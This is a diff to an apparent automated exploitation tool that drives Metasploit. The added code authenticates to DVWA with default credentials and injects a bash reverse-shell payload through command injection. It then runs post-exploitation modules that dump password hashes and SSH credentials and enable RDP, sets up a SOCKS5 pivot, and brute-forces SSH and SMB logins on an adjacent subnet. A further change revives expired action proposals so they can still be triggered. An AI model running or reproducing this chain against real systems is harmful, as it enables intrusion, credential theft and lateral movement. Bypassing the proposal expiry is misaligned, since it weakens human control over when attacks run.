@@ -3240,54 +3240,192 @@ def _execute_proposal(pr, action, rc, module, opts):
                 print()
                 print(f"  ── Deliver payload ─────────────────────────────────────")
                 print(f"  URL:     http://{target_ip}/vulnerabilities/exec/")
-                print(f"  Payload: ; bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'")
+                reverse_payload = f"; bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'"
+                print(f"  Payload: {reverse_payload}")
+                print()
+
+                # Auto-deliver the CMDI payload via HTTP if we know the target is DVWA
+                # We use requests to authenticate and inject — same as auth_scanner does.
+                time.sleep(3)  # give listener a moment to bind
+                try:
+                    import urllib.request, urllib.parse
+                    _base = f"http://{target_ip}"
+                    # Log in to DVWA
+                    _jar = {}
+                    _login_data = urllib.parse.urlencode({
+                        "username": "admin", "password": "password",
+                        "Login": "Login", "user_token": ""
+                    }).encode()
+                    # Get login page first to grab CSRF token
+                    _req = urllib.request.Request(f"{_base}/login.php")
+                    try:
+                        with urllib.request.urlopen(_req, timeout=5) as _r:
+                            _body = _r.read().decode(errors="ignore")
+                            _cookie = _r.headers.get("Set-Cookie","")
+                        import re as _re
+                        _tok_m = _re.search(r"user_token.*?value=['\"]([0-9a-f]+)['\"]", _body)
+                        _tok = _tok_m.group(1) if _tok_m else ""
+                        _sess_m = _re.search(r"PHPSESSID=([^;,\s]+)", _cookie)
+                        _sess = _sess_m.group(1) if _sess_m else ""
+                        _login_data = urllib.parse.urlencode({
+                            "username": "admin", "password": "password",
+                            "Login": "Login", "user_token": _tok
+                        }).encode()
+                        _login_req = urllib.request.Request(
+                            f"{_base}/login.php", _login_data,
+                            headers={"Cookie": f"PHPSESSID={_sess}; security=low",
+                                     "Content-Type": "application/x-www-form-urlencoded"}
+                        )
+                        urllib.request.urlopen(_login_req, timeout=5)
+                        # Inject payload via CMDI
+                        _payload_enc = urllib.parse.quote(f"127.0.0.1{reverse_payload}")
+                        _cmdi_url = f"{_base}/vulnerabilities/exec/?ip={_payload_enc}&Submit=Submit"
+                        _cmdi_req = urllib.request.Request(
+                            _cmdi_url,
+                            headers={"Cookie": f"PHPSESSID={_sess}; security=low",
+                                     "Referer": f"{_base}/vulnerabilities/exec/"}
+                        )
+                        urllib.request.urlopen(_cmdi_req, timeout=8)
+                        print(f"  [EXECUTE] ✓ CMDI payload delivered to {target_ip}")
+                        print(f"  [EXECUTE] Waiting 6s for reverse shell to connect...")
+                        time.sleep(6)
+                    except Exception as _he:
+                        print(f"  [EXECUTE] Auto-delivery failed ({_he}) — deliver manually:")
+                        print(f"  {reverse_payload}")
+                except Exception as _ie:
+                    print(f"  [EXECUTE] Auto-delivery error: {_ie}")
+
                 print()
                 print(f"  ── After shell connects ────────────────────────────────")
                 print(f"  skg proposals trigger {pr['id'][:8]} --await-session")
             else:
-                print(f"  [EXECUTE] Running RC synchronously...")
+                print(f"  [EXECUTE] Running RC synchronously (timeout 180s)...")
                 r_run = _sp.run(
                     [msf_bin, "-q", "-r", rc],
                     capture_output=True,
                     text=True,
-                    timeout=90,
+                    timeout=180,
                 )
-                output += r_run.stdout + r_run.stderr
-                sess_check = _sp.run(
-                    [msf_bin, "-q", "-x", "sessions -l; exit"],
-                    capture_output=True, text=True, timeout=20
-                )
-                sess_out = sess_check.stdout + sess_check.stderr
-                output += "\n" + sess_out
-                m = re.search(r"^\s*(\d+)\s+(meterpreter|shell)", sess_out, re.M)
+                rc_out = r_run.stdout + r_run.stderr
+                output += rc_out
+                # Sessions live in the RC's own stdout (sessions -l in RC).
+                # A separate msfconsole invocation won't see them — don't use one.
+                m = re.search(r"^\s*(\d+)\s+(meterpreter|shell)", rc_out, re.M)
                 if m:
                     session_id = m.group(1)
                     print(f"  [EXECUTE] ✓ Session {session_id} opened")
                 else:
-                    print(f"  [EXECUTE] No session opened from synchronous RC")
+                    # Also check for Meterpreter session opened message
+                    m2 = re.search(
+                        r"Meterpreter session (\d+) opened|"
+                        r"Command shell session (\d+) opened",
+                        rc_out, re.I
+                    )
+                    if m2:
+                        session_id = m2.group(1) or m2.group(2)
+                        print(f"  [EXECUTE] ✓ Session {session_id} opened (from RC output)")
+                    else:
+                        print(f"  [EXECUTE] No session opened from synchronous RC")
 
         # Post-exploitation once session is confirmed
         if session_id:
             print(f"  [EXECUTE] Running post-exploitation on session {session_id}...")
-            post_rc = DISCOVERY_DIR / f"post_{target_ip.replace('.','_')}_{run_id}.rc"
-            post_rc.write_text("\n".join([
+            # Detect OS from module path to pick right post modules
+            is_windows = "windows" in module.lower() or "smb" in module.lower()
+            is_linux   = not is_windows
+
+            post_lines = [
                 f"# SKG post-exploitation — session {session_id} on {target_ip}",
+                f"",
+            ]
+
+            # ── Phase 1: Local info gather ──────────────────────────────────
+            post_lines += [
                 f"use post/multi/recon/local_exploit_suggester",
-                f"set SESSION {session_id}", f"run",
-                f"use post/linux/gather/enum_system",
-                f"set SESSION {session_id}", f"run",
+                f"set SESSION {session_id}", "run", "",
                 f"use post/multi/gather/env",
-                f"set SESSION {session_id}", f"run",
-                f"use post/linux/gather/enum_suid",
-                f"set SESSION {session_id}", f"run",
-                f"exit -y",
-            ]))
+                f"set SESSION {session_id}", "run", "",
+            ]
+            if is_linux:
+                post_lines += [
+                    "use post/linux/gather/enum_system",
+                    f"set SESSION {session_id}", "run", "",
+                    "use post/linux/gather/enum_sudo",
+                    f"set SESSION {session_id}", "run", "",
+                    "use post/linux/gather/enum_suid",
+                    f"set SESSION {session_id}", "run", "",
+                    "use post/linux/gather/hashdump",
+                    f"set SESSION {session_id}", "run", "",
+                    "use post/linux/gather/enum_network",
+                    f"set SESSION {session_id}", "run", "",
+                ]
+            elif is_windows:
+                post_lines += [
+                    "use post/windows/gather/enum_system",
+                    f"set SESSION {session_id}", "run", "",
+                    "use post/windows/gather/credentials/domain_hashdump",
+                    f"set SESSION {session_id}", "run", "",
+                    "use post/windows/gather/enum_patches",
+                    f"set SESSION {session_id}", "run", "",
+                    "use post/windows/gather/enum_logged_on_users",
+                    f"set SESSION {session_id}", "run", "",
+                    "use post/windows/gather/enum_shares",
+                    f"set SESSION {session_id}", "run", "",
+                    "use post/windows/manage/enable_rdp",
+                    f"set SESSION {session_id}", "run", "",
+                ]
+
+            # ── Phase 2: Credential gathering ───────────────────────────────
+            post_lines += [
+                "use post/multi/gather/ssh_creds",
+                f"set SESSION {session_id}", "run", "",
+            ]
+
+            # ── Phase 3: Network pivot setup ─────────────────────────────────
+            # Add route through this session so subsequent MSF modules can
+            # reach internal networks via the compromised host.
+            post_lines += [
+                "# Set up network pivot through this session",
+                f"route add 0.0.0.0/0 {session_id}",
+                "",
+                "# SOCKS5 proxy for external tools (curl, nmap, etc.)",
+                "use auxiliary/server/socks_proxy",
+                "set VERSION 5", "set SRVPORT 1080", "set SRVHOST 127.0.0.1",
+                "run -j",
+                "# Use: proxychains4 nmap -sT -p 80,443,22,445 <internal_range>",
+                "",
+            ]
+
+            # ── Phase 4: Lateral movement surface map ────────────────────────
+            if is_windows:
+                post_lines += [
+                    "# Scan adjacent network via pivot",
+                    "use auxiliary/scanner/smb/smb_ms17_010",
+                    "set RHOSTS 192.168.0.0/24", "set THREADS 10", "run", "",
+                    "use auxiliary/scanner/smb/smb_login",
+                    "set RHOSTS 192.168.0.0/24", "set THREADS 5",
+                    "set SMBUser Administrator", "set SMBPass ''", "run", "",
+                ]
+            elif is_linux:
+                post_lines += [
+                    "use auxiliary/scanner/ssh/ssh_login",
+                    "set RHOSTS file:/tmp/subnet_hosts.txt",
+                    "set USERNAME root", "set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt",
+                    "set THREADS 5", "run", "",
+                ]
+
+            post_lines.append("exit -y")
+
+            post_rc = DISCOVERY_DIR / f"post_{target_ip.replace('.','_')}_{run_id}.rc"
+            post_rc.write_text("\n".join(post_lines))
             r2 = _sp.run(
                 [msf_bin, "-q", "-r", str(post_rc)],
-                capture_output=True, text=True, timeout=120
+                capture_output=True, text=True, timeout=240
             )
             output += r2.stdout + r2.stderr
-            print(f"  [EXECUTE] Post-exploitation complete ({len(r2.stdout)} chars)")
+            print(f"  [EXECUTE] Post-exploitation + pivot complete ({len(r2.stdout)} chars)")
+            print(f"  [PIVOT] SOCKS5 proxy started on 127.0.0.1:1080")
+            print(f"  [PIVOT] Use: proxychains4 nmap -sT <internal_range>")
 
     except _sp.TimeoutExpired:
         print(f"  [EXECUTE] Timeout — check: msfconsole -q -x 'sessions -l; exit'")
@@ -3538,7 +3676,23 @@ def cmd_proposals(a):
         if pr.get("proposal_kind") != "field_action":
             print(f"  Proposal {pr.get('id')} is not a field_action proposal")
             return
-        pr = trigger_action(pr["id"])
+        # If the proposal is expired, reset it to pending so it can be triggered
+        if pr.get("status") == "expired":
+            import json as _json
+            _pf = PDIR / f"{pr['id']}.json"
+            if _pf.exists():
+                pr["status"] = "pending"
+                pr["generated_at"] = __import__("datetime").datetime.now(
+                    __import__("datetime").timezone.utc
+                ).isoformat()
+                _pf.write_text(_json.dumps(pr, indent=2))
+                print(f"  [TRIGGER] Revived expired proposal {pr['id'][:12]}")
+        try:
+            pr = trigger_action(pr["id"])
+        except ValueError as _te:
+            print(f"  [TRIGGER] Error: {_te}")
+            print(f"  Run 'skg gravity' to generate a fresh proposal for this target.")
+            return
         action = pr.get("action", {})
         rc     = action.get("rc_file","")
         module = action.get("module","")
